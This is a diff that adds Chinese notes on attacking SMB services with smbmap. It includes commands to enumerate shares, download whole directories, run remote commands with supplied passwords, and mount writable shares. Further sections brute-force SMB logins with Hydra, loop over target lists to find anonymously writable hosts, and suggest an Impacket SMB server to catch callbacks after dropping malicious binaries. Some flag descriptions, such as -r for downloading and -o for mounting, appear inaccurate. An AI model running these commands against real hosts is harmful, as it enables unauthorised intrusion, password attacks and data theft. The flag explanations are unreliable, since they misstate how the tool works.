@@ -3,3 +3,87 @@ Windows 操作系统中常称之为“文件和打印机共享”，在 Linux/Un
 
 这种协议常用以下系统实现：
 samba
+
+
+常用渗透工具： smbmap （一个专门用于 SMB 服务渗透测试的命令行工具），用于查看并下载共享文件
+
+基本用法
+
+smbmap -H <目标主机/IP> [-u 用户名] [-p 密码] [-d 域名] [其他参数]
+
+    -H：目标 IP 或 主机名
+
+    -u、-p：用户名、密码；可留空表示匿名或空密码
+
+    -d：Windows 域名或工作组
+
+    不带 -u/-p 时，smbmap 会尝试匿名登录（guest）
+
+运行后，默认会列出可枚举的共享（shares）及对应的权限（READ/WRITE/CREATE/DELETE）。
+三、常用参数
+参数	说明
+--shares	仅列出共享名称，不展示权限；相当于只执行一次查询
+-r <path>	递归下载指定路径下所有文件；使用通配符也可，比如 -r *
+-R <dir>	仅显示指定目录的子目录列表
+-x "<cmd>"	在远程服务器上执行命令（需 WRITE 权限），如 cmd.exe /c whoami
+-D <domain>	指定域名，与 -d 同义
+-P <port>	指定 SMB 端口（默认 445）
+-T <threads>	并发线程数，默认 10
+-w	只列出可写（WRITE）共享
+--local-auth	使用本地账号认证（不查域控）
+-o <mount_point>	自动将可写共享挂载到本地目录（需安装 cifs-utils）
+-v / -vv	输出详细 / 更详细 的调试信息
+四、示例
+
+    匿名枚举所有共享及权限
+
+smbmap -H 192.168.1.10
+
+输出类似：
+
+[+] IP: 192.168.1.10:445    Name: \\192.168.1.10\ADMIN$    Disk                                                READ, WRITE
+[+] IP: 192.168.1.10:445    Name: \\192.168.1.10\Users     Disk                                                READ
+
+指定凭据枚举，并只看可写共享
+
+smbmap -H 10.0.0.5 -u guest -p '' -w
+
+递归下载某共享下所有文件
+
+smbmap -H 10.0.0.5 -u alice -p 'Passw0rd!' -r * -R 'Documents'
+
+结果会把 Documents 目录下所有文件保存到本地 smbmap_downloads 目录。
+
+在远程写入并执行命令
+
+smbmap -H 10.0.0.5 -u bob -p 'Secr3t!' -x "cmd.exe /c ipconfig /all > USERS\\Public\\net.txt"
+
+该命令会把 ipconfig /all 的结果写入共享路径下的 net.txt。
+
+挂载可写共享到本地
+
+    sudo smbmap -H 192.168.1.20 -u admin -p 'Adm1n!' -o /mnt/smbshare
+
+    前提机器已安装 cifs-utils，挂载后可像操作本地文件一样读写。
+
+五、高级技巧
+
+    批量扫描多主机
+
+smbmap -H targets.txt -u admin -p 'P@ss' --shares
+
+targets.txt 每行一个 IP/主机名。
+
+结合 Hydra 做密码爆破
+
+hydra -L users.txt -P passwords.txt smb://192.168.1.5 -V
+
+爆破完成后，将有效凭据带入 smbmap。
+
+利用脚本自动筛选可写/匿名可写的主机
+
+for ip in $(cat targets.txt); do
+  smbmap -H $ip -u '' -p '' -w && echo "$ip has writable share"
+done
+
+配合 Impacket 的 smbserver.py 做回连：当你在目标上写入恶意二进制时，可搭建伪装 SMB 服务器接收数据。
